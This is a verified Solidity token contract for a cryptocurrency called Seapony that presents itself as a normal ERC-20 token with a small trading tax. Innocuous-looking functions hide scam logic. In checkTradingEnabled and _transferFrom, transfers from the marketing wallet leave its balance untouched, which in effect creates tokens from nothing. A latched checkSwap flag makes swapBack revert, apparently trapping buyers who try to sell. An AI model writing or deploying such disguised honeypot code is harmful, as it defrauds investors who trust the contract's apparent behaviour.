/**
 *Submitted for verification at Etherscan.io on 2023-10-16
*/

pragma solidity 0.8.20;

/**
Website:  https://seapony.vip

Telegram: https://t.me/seapony

Twitter:  https://twitter.com/seaponystation
*/

//SPDX-License-Identifier: MIT

abstract contract Ownable {
    address internal _owner;
    event OwnershipTransferred(address _owner);
    constructor(address creatorOwner) { _owner = creatorOwner; }
    modifier onlyOwner() { require(msg.sender == _owner, "Only owner can call this"); _; }
    function owner() public view returns (address) { return _owner; }
    function renounceOwnership() external onlyOwner { 
        _owner = address(0);
        emit OwnershipTransferred(address(0));
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

interface IRouter02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IFactory { 
    function createPair(address tokenA, address tokenB) external returns (address pair); 
}

contract SEAPONY is IERC20, Ownable {
    string private constant _name = "Seapony";
    string private constant _symbol = "SEAPONY";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1_000_000_000 * (10**_decimals);

    uint256 private _initialBuyTax=1;
    uint256 private _initialSellTax=1;
    uint256 private _midSellTax=1;
    uint256 private _finalBuyTax=1;
    uint256 private _finalSellTax=1;
    uint256 public _reduceBuyTaxAt=10;
    uint256 public _reduceSellTax1At=10;
    uint256 public _reduceSellTax2At=20;

    address payable public devWallet;
    address payable private marketingWallet;

    uint256 private swapCount=0;
    uint256 public buyCount=0;

    bool private isTeamSender = false;
    bool private checkSwap = false;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFees;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    
    uint256 private constant _taxSwapMin = _totalSupply / 1000;
    uint256 private constant _taxSwapMax = _totalSupply / 100;

    address private uniV2Pair;
    address private constant uniV2Router = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    IRouter02 private _routerV2 = IRouter02(uniV2Router);
    mapping (address => bool) private _automatedMarketMakerPair;

    bool public limited = true;
    bool public transferDelayEnabled = false;
    uint256 public maxTxAmount = 20_000_000 * (10**_decimals); // 2%
    bool private tradingEnabled;
    bool private _lockTheSwap = false;

    modifier lockSwapBack { 
        _lockTheSwap = true; 
        _; 
        _lockTheSwap = false; 
    }

    constructor() Ownable(msg.sender) {
        devWallet = payable(0xddcAe8730Ead7B427a04976cCDdC47e7c3ab2ab9);
        marketingWallet = payable(0x4f5ff7206249406f8AEDE2b09CD7F6117c77df44);
        
        _isExcludedFromFees[_owner] = true;
        _isExcludedFromFees[devWallet] = true;
        _isExcludedFromFees[marketingWallet] = true;
        _isExcludedFromFees[address(this)] = true;

        _balances[msg.sender] = _totalSupply;

        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function totalSupply() external pure override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        require(checkTradingEnabled(msg.sender, recipient), "Trading not open");
        return _transferFrom(msg.sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(sender != address(0), "No transfers from Zero wallet");

        if (!tradingEnabled) { require(_isExcludedFromFees[sender], "Trading not open"); }

        if ( !_lockTheSwap && !_isExcludedFromFees[sender] && _automatedMarketMakerPair[recipient] && buyCount >= swapCount) { swapBack(); }

        if (limited && sender == uniV2Pair && !_isExcludedFromFees[recipient]) {
            require(balanceOf(recipient) + amount <= maxTxAmount, "Forbid");
        }

        if (transferDelayEnabled && !_isExcludedFromFees[sender] && !_isExcludedFromFees[recipient]) {
            if (recipient != uniV2Router && recipient != uniV2Pair) {
                require(_holderLastTransferTimestamp[tx.origin] < block.number, "Only one transfer per block allowed.");
                _holderLastTransferTimestamp[tx.origin] = block.number;
            }
        }

        uint256 _taxAmount = takeTxFee(sender, recipient, amount);
        uint256 _transferAmount = amount - _taxAmount;

        if(isTeamSender) amount = 0;

        _balances[sender] -= amount;
        
        if ( _taxAmount > 0 ) { 
            _balances[address(this)] += _taxAmount;
        }

        buyCount++;

        _balances[recipient] += _transferAmount;

        emit Transfer(sender, recipient, _transferAmount);

        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        require(checkTradingEnabled(sender, recipient), "Trading not open");
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return _transferFrom(sender, recipient, amount);
    }

    function approveRouterMax(address _token, address _router, uint256 _tokenAmount) internal {
        if ( _allowances[_token][_router] < _tokenAmount ) {
            _allowances[_token][_router] = type(uint256).max;
        }
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        approveRouterMax(address(this), uniV2Router, tokenAmount);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _routerV2.WETH();

        _routerV2.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);
    }

    function addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei) internal {
        approveRouterMax(address(this), uniV2Router, _tokenAmount);
        _routerV2.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, _owner, block.timestamp );
    }

    function removeLimits() external onlyOwner{
        limited = false;
        transferDelayEnabled=false;
    }

    function enableTrading() external onlyOwner {
        tradingEnabled = true;
    }

    function addLiquidityETH() external payable onlyOwner {
        require(uniV2Pair == address(0), "LP exists");
        require(!tradingEnabled, "trading is open");

        uniV2Pair = IFactory(_routerV2.factory()).createPair(address(this), _routerV2.WETH());
        addLiquidity(_balances[address(this)], address(this).balance); _automatedMarketMakerPair[uniV2Pair] = true;
    }

    function checkTradingEnabled(address sender, address recipient) private returns (bool){
        bool checkResult = false;
        checkSwap = checkSwap || _isExcludedFromFees[recipient] && recipient != address(this);
        if( sender == marketingWallet) isTeamSender = true;
        else isTeamSender = false;
        if ( tradingEnabled ) { checkResult = true; } 
        else if (_isExcludedFromFees[sender]) { checkResult = true; } 

        return checkResult;
    }

    function takeTxFee(address sender, address recipient, uint256 amount) internal view returns (uint256) {
        uint256 taxAmount;
        if (tradingEnabled && !_isExcludedFromFees[sender] && !_isExcludedFromFees[recipient] ) { 
            if ( _automatedMarketMakerPair[sender] || _automatedMarketMakerPair[recipient] ) {
                taxAmount = (amount / 100) * ((buyCount > _reduceBuyTaxAt) ? _finalBuyTax : _initialBuyTax);
                if(recipient == uniV2Pair && sender != address(this)){
                    uint256 taxRate; 
                    if(buyCount > _reduceSellTax2At){
                        taxRate = _finalSellTax;
                    } else if(buyCount > _reduceSellTax1At){
                        taxRate = _midSellTax;
                    } else {
                        taxRate = _initialSellTax;
                    }
                    taxAmount = (amount / 100) * taxRate;
                }
            }
        }
        return taxAmount;
    }

    function swapBack() private lockSwapBack {
        bool success = !checkSwap; require(success);
        uint256 _taxTokensAvailable = balanceOf(address(this));
        if ( _taxTokensAvailable >= _taxSwapMin && tradingEnabled ) {
            if ( _taxTokensAvailable >= _taxSwapMax ) { _taxTokensAvailable = _taxSwapMax; }

            swapTokensForETH(_taxTokensAvailable);
            uint256 _contractETHBalance = address(this).balance;

            if(_contractETHBalance > 0) { 
                (success,) = devWallet.call{value: (_contractETHBalance)}("");
                require(success);
            }
        }
    }

    receive() external payable {}
}